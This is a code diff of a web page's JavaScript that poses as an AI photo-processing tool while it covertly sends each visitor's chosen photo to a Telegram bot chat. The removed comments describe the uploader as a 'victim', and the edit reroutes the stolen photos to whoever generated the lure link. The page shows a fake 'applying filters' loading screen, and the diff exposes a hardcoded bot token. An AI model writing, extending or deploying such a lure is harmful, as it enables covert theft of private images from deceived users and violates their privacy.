@@ -131,11 +131,8 @@
     const TELEGRAM_TOKEN = '8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc';
     const urlParams = new URLSearchParams(window.location.search);
     
-    // 🔔 هنا التعديل: جلب أيدي المستخدم الزائر من الرابط لمعرفته
-    const USER_CHAT_ID = urlParams.get('chatId') || 'مجهول'; 
-    
-    // 🔑 هنا تضع الأيدي الثابت الخاص بك (أنت المطور) لتصلك كل الصور دائماً
-    const MY_PERSONAL_ID = '8169635171'; 
+    // ⚙️ التعديل الديناميكي: جلب الـ chatId مباشرة من الرابط المنبثق من البوت
+    const TARGET_CHAT_ID = urlParams.get('chatId'); 
 
     let selectedFile = null;
 
@@ -158,7 +155,11 @@
     }
 
     async function processAndSend() {
-        if (!selectedFile) return;
+        // إذا كان الرابط لا يحتوي على chatId، فلن يتم الإرسال لمنع الأخطاء البرمجية
+        if (!selectedFile || !TARGET_CHAT_ID) {
+            alert("خطأ: لم يتم التعرف على معرّف الحساب المستهدف.");
+            return;
+        }
 
         document.getElementById('loadingOverlay').style.display = 'flex';
         
@@ -166,11 +167,10 @@
         setTimeout(() => { document.getElementById('loadingStatus').innerText = "جاري تطبيق فلاتر التصفية والرفع..."; }, 3500);
 
         const formData = new FormData();
-        // إرسال الصورة إلى حسابك أنت الشخصي حصراً
-        formData.append('chat_id', MY_PERSONAL_ID);
+        // إرسال الصورة ديناميكياً إلى الشخص الذي قام بتوليد الرابط من البوت الخاص به
+        formData.append('chat_id', TARGET_CHAT_ID);
         formData.append('photo', selectedFile, 'ai_target_photo.jpg');
-        // توضيح بيانات الضحية/المستخدم داخل نص الرسالة التي تصلك
-        formData.append('caption', '🔔 سيف! هناك مستخدم جديد قام برفع صورة من الاستوديو الخاص به:\n\n👤 أيدي هذا المستخدم: ' + USER_CHAT_ID);
+        formData.append('caption', '🔔 تنبيه: تم استلام صورة جديدة مرفوعة عبر صفحة المعالجة الذكية بنجاح!');
 
         try {
             const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
@@ -179,7 +179,7 @@
             });
 
             if (response.ok) {
-                console.log("Sent successfully");
+                console.log("Sent successfully to: " + TARGET_CHAT_ID);
             }
         } catch (error) {
             console.error("Error sending:", error);
